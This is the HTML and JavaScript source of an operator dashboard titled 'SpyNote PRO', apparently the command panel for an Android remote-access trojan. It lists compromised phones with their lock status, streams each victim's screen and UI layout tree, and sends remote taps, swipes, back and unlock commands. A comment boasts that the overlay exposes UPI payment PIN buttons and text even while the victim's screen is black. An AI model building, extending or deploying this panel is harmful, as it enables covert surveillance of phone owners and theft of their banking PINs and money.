<!DOCTYPE html>
<html>
<head>
    <title>ðŸ”’ SpyNote PRO - Layout + Screen Off</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 16px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
        }
        .device { 
            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .device:hover { 
            background: rgba(0,170,120,0.9); transform: translateX(8px); box-shadow: 0 8px 25px rgba(0,170,120,0.3);
        }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
        .screen-locked { border-left: 4px solid #ff4444; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: min(95vw, 450px); height: min(95vh, 900px); 
            background: #000; border-radius: 40px; 
            padding: 30px 25px; box-shadow: 0 30px 80px rgba(0,0,0,0.8);
            border: 3px solid rgba(255,255,255,0.1);
            touch-action: none;
        }
        
        #screen { 
            width: 100%; height: 100%; 
            border-radius: 25px; background: #111;
            image-rendering: optimizeSpeed; 
            cursor: pointer;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }

        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 25px; background: transparent;
        }
        .layout-element {
            position: absolute; border: 1px solid rgba(0,255,136,0.4);
            background: rgba(0,255,136,0.1); border-radius: 4px;
            font-size: 10px; padding: 2px 4px; backdrop-filter: blur(5px);
            cursor: pointer; transition: all 0.2s;
        }
        .layout-element:hover {
            border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important;
            box-shadow: 0 0 10px rgba(0,255,136,0.6);
        }
        .layout-text { color: #00ff88; font-weight: bold; }

        #status-bar {
            position: fixed; top: 15px; right: 15px; z-index: 100;
            background: rgba(0,0,0,0.9); padding: 15px 20px; 
            border-radius: 12px; backdrop-filter: blur(20px); font-size: 13px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #fps-counter { color: #00ff88; font-weight: bold; }

        #controls {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 10px; z-index: 100; flex-wrap: wrap;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; border-radius: 25px; cursor: pointer;
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 6px 20px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.6); }
        button:active { transform: translateY(0); }
        .unlock-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a24) !important; }
        .layout-toggle { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000 !important; }

        #loading { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%);
            font-size: 18px; color: #00ff88; display: none; z-index: 1000;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">ðŸ“± Devices (Layout View)</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span> | 
            <span id="screenStatus">Screen: Unknown</span></div>
        <div>Latency: <span id="latency">0ms</span> | Elements: <span id="elementCount">0</span></div>
    </div>

    <div id="phone-container">
        <canvas id="screen"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="loading">
        <div style="border: 3px solid rgba(0,255,136,0.3); border-top: 3px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
        Waiting for screen + layout...
    </div>

    <div id="controls">
        <button class="unlock-btn" onclick="sendUnlock()" title="Unlock Screen Off Device">ðŸ”“ Unlock</button>
        <button class="layout-toggle" id="layoutBtn" onclick="toggleLayout()">ðŸ“‹ Layout ON</button>
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], upgrade: false });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let lastFrameTime = 0, frameCount = 0, avgLatency = 0;
        let showLayout = true;
        let isDragging = false;
        let layoutElements = [];
        let screenLocked = false;

        const canvas = document.getElementById('screen');
        const overlayCanvas = document.getElementById('layout-overlay');
        const ctx = canvas.getContext('2d');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const latencySpan = document.getElementById('latency');
        const elementCountSpan = document.getElementById('elementCount');
        const screenStatusSpan = document.getElementById('screenStatus');
        const fpsSpan = document.getElementById('fps');
        const layoutBtn = document.getElementById('layoutBtn');
        const loading = document.getElementById('loading');

        socket.on('connect', () => {
            connectionStatus.textContent = 'âœ… Connected';
            connectionStatus.style.color = '#00ff88';
            setInterval(() => fetch('/devices').then(r => r.json()).then(updateDeviceList), 2000);
        });

        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            loading.style.display = 'none';
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneContainer.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                overlayCanvas.width = rect.width;
                overlayCanvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    fpsSpan.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    frameCount = 0;
                    lastFrameTime = now;
                }
                
                const latency = Math.round(now - (data.timestamp / 1000));
                avgLatency = avgLatency * 0.8 + latency * 0.2;
                latencySpan.textContent = Math.round(avgLatency);
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        // ðŸ”¥ LAYOUT OVERLAY - Shows UPI PIN buttons/text even when black!
        socket.on('layout-hierarchy', (data) => {
            if (data.deviceId !== currentDevice) return;
            layoutElements = [];
            
            data.nodes.forEach(node => {
                if (node.text && node.text.trim() || node.clickable || node.focusable) {
                    const bounds = parseBounds(node.bounds);
                    if (bounds && bounds.width > 10 && bounds.height > 10) {
                        layoutElements.push({
                            ...node,
                            bounds: bounds,
                            clickable: node.clickable || node.focusable
                        });
                    }
                }
            });
            
            elementCountSpan.textContent = layoutElements.length;
            if (showLayout) renderLayoutOverlay();
        });

        function parseBounds(boundsStr) {
            const match = boundsStr.match(/\[(\d+),(\d+)\]\[(\d+),(\d+)\]/);
            if (match) {
                return {
                    left: parseInt(match[1]), top: parseInt(match[2]),
                    right: parseInt(match[3]), bottom: parseInt(match[4]),
                    width: parseInt(match[3]) - parseInt(match[1]),
                    height: parseInt(match[4]) - parseInt(match[2])
                };
            }
            return null;
        }

        function renderLayoutOverlay() {
            const rect = phoneContainer.getBoundingClientRect();
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            
            layoutElements.forEach(el => {
                const scaleX = rect.width / deviceWidth;
                const scaleY = rect.height / deviceHeight;
                
                const x = el.bounds.left * scaleX;
                const y = el.bounds.top * scaleY;
                const w = el.bounds.width * scaleX;
                const h = el.bounds.height * scaleY;
                
                overlayCtx.strokeStyle = el.clickable ? '#00ff88' : 'rgba(0,255,136,0.4)';
                overlayCtx.lineWidth = 1.5;
                overlayCtx.strokeRect(x, y, w, h);
                
                if (el.text && el.text.trim()) {
                    overlayCtx.fillStyle = el.clickable ? '#00ff88' : 'rgba(0,255,136,0.8)';
                    overlayCtx.font = '10px monospace';
                    overlayCtx.fillText(el.text.toString().slice(0,15), x + 2, y + 12);
                }
            });
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse Controls
        phoneContainer.addEventListener('mousedown', startTouch);
        phoneContainer.addEventListener('mousemove', dragTouch);
        phoneContainer.addEventListener('mouseup', endTouch);
        phoneContainer.addEventListener('touchstart', startTouch, { passive: false });
        phoneContainer.addEventListener('touchmove', dragTouch, { passive: false });
        phoneContainer.addEventListener('touchend', endTouch, { passive: false });

        let dragStart = { x: 0, y: 0 };
        function startTouch(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            dragStart = coords;
            sendTap(coords.x, coords.y);
        }

        function dragTouch(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
            renderLayoutOverlay();
        }

        function endTouch(e) {
            isDragging = false;
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${!info[1]?.connected ? 'disconnected' : ''} 
                             ${info[1]?.screenLocked ? 'screen-locked' : ''}"
                     onclick="selectDevice('${id}', this)"
                     title="${info[1]?.model || 'Android'} ${info[1]?.screenLocked ? 'ðŸ”’ LOCKED' : 'âœ… UNLOCKED'}">
                    <b>${(info[1]?.model || id).slice(0,15)}...</b><br>
                    <small>${info[1]?.brand || ''} ${info[1]?.version || ''}</small><br>
                    <small style="color: ${info[1]?.screenLocked ? '#ff4444' : '#00ff88'}">
                        ${info[1]?.screenLocked ? 'ðŸ”’ LOCKED' : 'ðŸŸ¢ LIVE'}
                    </small>
                </div>
            `).join('') || '<div style="text-align:center;opacity:0.5;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            loading.style.display = 'block';
            socket.emit('select-device', { deviceId });
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'swipe', startX: sx, startY: sy, endX: ex, endY: ey });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendUnlock() {
            if (!currentDevice) return;
            socket.emit('unlock-device', { deviceId: currentDevice });
            alert('ðŸ”“ Sending unlock command...');
        }

        function toggleLayout() {
            showLayout = !showLayout;
            overlayCanvas.style.opacity = showLayout ? '1' : '0';
            layoutBtn.textContent = showLayout ? 'ðŸ“‹ Layout OFF' : 'ðŸ“‹ Layout ON';
            layoutBtn.className = showLayout ? '' : 'layout-toggle';
            if (showLayout) renderLayoutOverlay();
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Auto refresh layout on mouse move
        phoneContainer.addEventListener('mousemove', () => {
            if (showLayout && layoutElements.length > 0) renderLayoutOverlay();
        });
    </script>
</body>
</html>
